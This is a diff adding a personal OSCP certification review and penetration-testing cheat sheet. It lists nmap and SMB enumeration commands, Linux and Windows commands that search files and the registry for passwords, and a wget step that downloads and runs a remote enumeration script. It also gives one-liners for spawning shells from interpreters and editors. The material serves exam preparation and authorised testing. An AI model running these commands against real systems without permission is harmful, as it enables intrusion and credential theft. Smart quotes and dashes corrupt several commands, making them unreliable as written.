@@ -1,0 +1,144 @@
+OSCP Review/Cheat Sheet
+After 30 days of lab time, 24 boxes, and countless nights of no sleep, I can officially say I passed OSCP. And like every other person who’s passed the course, I’m going to do a little write up, except this time. Before I begin, I’ll make it very clear I had previous experience in pen testing and information security. Overall, what makes this course so valuable isn’t the exploits itself, but the technique behind them. Anyone can type “searchsploit ENTER_SOMETHING_HERE” and hope for the best. The hard part is enumerating everything, from dirb to crawling anonymous FTP servers. Cheat sheet time…
+
+Enumeration:
+
+Sparta
+Hands down your best friend for the lab and exam. It run multiple NMAP scans, TCP and UDP along with the option of using unicorn. What makes this tool incredibly useful is that you can right click open ports and see what tools are available to use on it. Plus, who doesn’t love a clean GUI?
+Nmap:
+
+Set the ip address as a variable
+export ip=192.168.1.100 nmap -A -T4 -p- $ip
+Netcat port Scanning
+nc -nvv -w 1 -z $ip 3388-3390
+Discover active IPs usign ARP on the network: arp-scan $ip/24
+Discover who else is on the network
+netdiscover
+Discover IP Mac and Mac vendors from ARP
+netdiscover -r $ip/24
+Nmap stealth scan using SYN
+nmap -sS $ip
+Nmap stealth scan using FIN
+nmap -sF $ip
+Nmap Banner Grabbing
+nmap -sV -sT $ip
+Nmap OS Fingerprinting
+nmap -O $ip
+Nmap Regular Scan:
+nmap $ip/24
+Enumeration Scan
+nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt
+Enumeration Scan All Ports TCP / UDP and output to a txt file
+nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip
+Nmap output to a file:
+nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24
+Quick Scan:
+nmap -T4 -F $ip/24
+Quick Scan Plus:
+nmap -sV -T4 -O -F –version-light $ip/24
+Quick traceroute
+nmap -sn –traceroute $ip
+All TCP and UDP Ports
+nmap -v -sU -sS -p- -A -T4 $ip
+Intense Scan:
+nmap -T4 -A -v $ip
+Intense Scan Plus UDP
+nmap -sS -sU -T4 -A -v $ip/24
+Intense Scan ALL TCP Ports
+nmap -p 1-65535 -T4 -A -v $ip/24
+Intense Scan – No Ping
+nmap -T4 -A -v -Pn $ip/24
+Ping scan
+nmap -sn $ip/24
+Slow Comprehensive Scan
+nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 –script “default or (discovery and safe)” $ip/24
+Scan with Active connect in order to weed out any spoofed ports designed to troll you
+nmap -p1-65535 -A -T5 -sT $ip
+SMB
+
+SMB OS Discovery
+nmap $ip –script smb-os-discovery.nse
+Nmap port scan
+nmap -v -p 139,445 -oG smb.txt $ip-254
+Netbios Information Scanning
+nbtscan -r $ip/24
+Nmap find exposed Netbios servers
+nmap -sU –script nbstat.nse -p 137 $ip
+Nmap all SMB scripts scan
+SMB Enumeration Tools
+
+smbclient //MOUNT/share -I $ip -N
+rpcclient -U “” $ip
+enum4linux $ip
+enum4linux -a $ip
+SMB Finger Printing
+smbclient -L //$ip
+Nmap Scan for Open SMB Shares
+nmap -T4 -v -oA shares –script smb-enum-shares –script-args smbuser=username,smbpass=password -p445 192.168.10.0/24
+Nmap scans for vulnerable SMB Servers
+nmap -v -p 445 –script=smb-check-vulns –script-args=unsafe=1 $ip
+Nmap List all SMB scripts installed
+ls -l /usr/share/nmap/scripts/smb*
+Linux OS Enumeration
+
+List all SUID files
+find / -perm -4000 2>/dev/null
+Determine the current version of Linux
+cat /etc/issue
+Determine more information about the environment
+uname -a
+List processes running
+ps -xaf
+List the allowed (and forbidden) commands for the invoking use
+sudo -l
+List iptables rules
+iptables –table nat –list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security
+Windows OS Enumeration
+
+net config Workstation
+systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
+hostname
+net users
+ipconfig /all
+route print
+arp -A
+netstat -ano
+netsh firewall show state
+netsh firewall show config
+schtasks /query /fo LIST /v
+tasklist /SVC
+net start
+DRIVERQUERY
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+dir /s pass== cred == vnc == .config
+findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+File Enumeration
+Find UID 0 files root execution
+/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null
+Get handy linux file system enumeration script (/var/tmp)
+wget https://highon.coffee/downloads/linux-local-enum.sh chmod +x ./linux-local-enum.sh ./linux-local-enum.sh
+Find executable files updated in August
+find / -executable -type f 2> /dev/null | egrep -v “^/bin|^/var|^/etc|^/usr” | xargs ls -lh | grep Aug
+Find a specific file on linux
+find /. -name suid\*
+Find all the strings in a file
+strings <filename>
+Determine the type of a file
+file <filename>
+Spawning Shells:
+
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+echo os.system(‘/bin/bash’)
+/bin/sh -i
+perl —e ‘exec “/bin/sh”;’
+perl: exec “/bin/sh”;
+ruby: exec “/bin/sh”
+lua: os.execute(‘/bin/sh’)
+From within IRB: exec “/bin/sh”
+From within vi: :!bash or
+:set shell=/bin/bash:shell
+From within vim ‘:!bash’:
+From within nmap: !sh
